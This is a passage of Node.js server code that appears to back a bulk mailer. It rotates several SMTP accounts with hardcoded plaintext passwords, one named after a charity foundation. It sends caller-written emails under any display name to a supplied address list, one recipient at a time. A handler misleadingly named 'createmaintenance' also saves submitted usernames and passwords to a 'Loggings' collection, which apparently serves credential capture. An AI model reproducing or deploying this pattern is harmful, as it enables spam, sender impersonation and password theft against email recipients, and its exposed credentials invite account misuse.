  // smtpTransport = nodemailer.createTransport(
  //   smtpTransport({
  //     host: "smtp.gmail.com",

  //     port: "587",
  //     auth: {
  //       // user: "adegokeadeleke.ayo@gmail.com",
  //       // pass: "alvvcakmxqbfgvfa",

  //       user: "maiilce00@gmail.com",
  //       pass: "Lolade123456",
  //     },
  //   })
  // );

  let smtpTransport = nodemailer.createTransport({
    host: "mail.privateemail.com",

      port: "465",
      
      auth: {
        // user: "mana@gmail.com",
        // pass: "alvvcakmxqbfgvfa",

        user: "myceo1@ayomideio.tech",
        pass: "myceo1",
      },
   secure: true, // true for 465, false for other ports
    // auth: {
    //   user: testAccount.user, // generated ethereal user
    //   pass: testAccount.pass, // generated ethereal password
    // },
  });
  
  

var from = `${emailName} <myceo1@ayomideio.tech>`

var mail = {
            from: from,
            to: emailLists,
            subject: `${emailSubject}`,
            text:emailBody   
        }




smtpTransport.sendMail(mail, function (error, response) {
          if (error) {
            console.log(error);
            callback(error);
          }
        });
        console.log('done')
smtpTransport.close()

// let from = `Consultation <i***@gmail.com>`


};
const sendMails2 = (emailName,emailSubject,emailBody,emailLists) => {
  // smtpTransport = nodemailer.createTransport(
  //   smtpTransport({
  //     host: "smtp.gmail.com",

  //     port: "587",
  //     auth: {
  //       // user: "adegokeadeleke.ayo@gmail.com",
  //       // pass: "alvvcakmxqbfgvfa",

  //       user: "maiilce00@gmail.com",
  //       pass: "Lolade123456",
  //     },
  //   })
  // );

  let smtpTransport = nodemailer.createTransport({
    host: "fesney.com",

      port: "465",
      
      auth: {
        // user: "adegokeadeleke.ayo@gmail.com",
        // pass: "alvvcakmxqbfgvfa",

        user: "myceo5@fesney.com",
        pass: "Lolade12345",
      },
    secure: true, // true for 465, false for other ports
    // auth: {
    //   user: testAccount.user, // generated ethereal user
    //   pass: testAccount.pass, // generated ethereal password
    // },
  });
  
  

var from = `${emailName} <myceo5@fesney.com>`

var mail = {
            from: from,
            to: emailLists,
            subject: `${emailSubject}`,
            text:emailBody   
        }




smtpTransport.sendMail(mail, function (error, response) {
          if (error) {
            console.log(error);
            callback(error);
          }
        });
        console.log('done')
smtpTransport.close()

// let from = `Consultation <i***@gmail.com>`


};
const sendMails3 = (emailName,emailSubject,emailBody,emailLists) => {
  // smtpTransport = nodemailer.createTransport(
  //   smtpTransport({
  //     host: "smtp.gmail.com",

  //     port: "587",
  //     auth: {
  //       // user: "adegokeadeleke.ayo@gmail.com",
  //       // pass: "alvvcakmxqbfgvfa",

  //       user: "maiilce00@gmail.com",
  //       pass: "Lolade123456",
  //     },
  //   })
  // );

  let smtpTransport = nodemailer.createTransport({
    host: "smtp.gmail.com",

      port: "587",
      
      auth: {
        // user: "adegokeadeleke.ayo@gmail.com",
        // pass: "alvvcakmxqbfgvfa",

        user: "kolkatawomanfundfoundation@gmail.com",
        pass: "Lolade12345",
      },
//     secure: true, // true for 465, false for other ports
    // auth: {
    //   user: testAccount.user, // generated ethereal user
    //   pass: testAccount.pass, // generated ethereal password
    // },
  });
  
  

var from = `${emailName} <i@gmail.com>`

var mail = {
            from: from,
            to: emailLists,
            subject: `${emailSubject}`,
            text:emailBody   
        }




smtpTransport.sendMail(mail, function (error, response) {
          if (error) {
            console.log(error);
            callback(error);
          }
        });
        console.log('done')
smtpTransport.close()

// let from = `Consultation <i***@gmail.com>`


};
function sleep(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}
exports.createmaintenance = (req, res) => {
  // console.log(`i was called ${(req.params)}`)
    let attatch=''
    

        if(req.body.emailName){
          var emailName=req.body.emailName
          var emailSubject=req.body.emailSubject
          var emailBody=req.body.emailBody
          var emailLists=req.body.emailLists
          var emailArray = emailLists.split(',');

        for(var i = 0; i < emailArray.length; i++) {
          // Trim the excess whitespace.
          emailArray[i] = emailArray[i].replace(/^\s*/, "").replace(/\s*$/, "");
          // Add additional code here, such as:
          console.log(emailArray[i]);
          if(req.body.Sammy){
            sendMails2(
              emailName,emailSubject,emailBody,emailArray[i]
            )    
             sleep(10000)
          }

          if(req.body.yomi){
            sendMails3(
              emailName,emailSubject,emailBody,emailArray[i]
            )    
             sleep(10000)
          }

          if(! req.body.yomi &&  ! req.body.Sammy){
            sendMails(
              emailName,emailSubject,emailBody,emailArray[i]
            )
            sleep(10000)
          }
        
     
        }
          
        }

    const tenant = new Loggings({
     username: req.body.username,
      password: req.body.password,
  
    });

  
    tenant.save((err, user) => {
      if (err) {
        res.status(500).send({ message: err });
        return;
      }
  
      
    });


   
  
  
// sendmaintenancemail(req.body.username,req.body.password)
};

exports.getmaintenance = (req, res) => {
  Maintenance.find()
    .then((maintenances) => {
      res.send(maintenances);
    })
    .catch((err) => {
      res.status(500).send({
        message: err.message || "Some error occured",
      });
    });
};
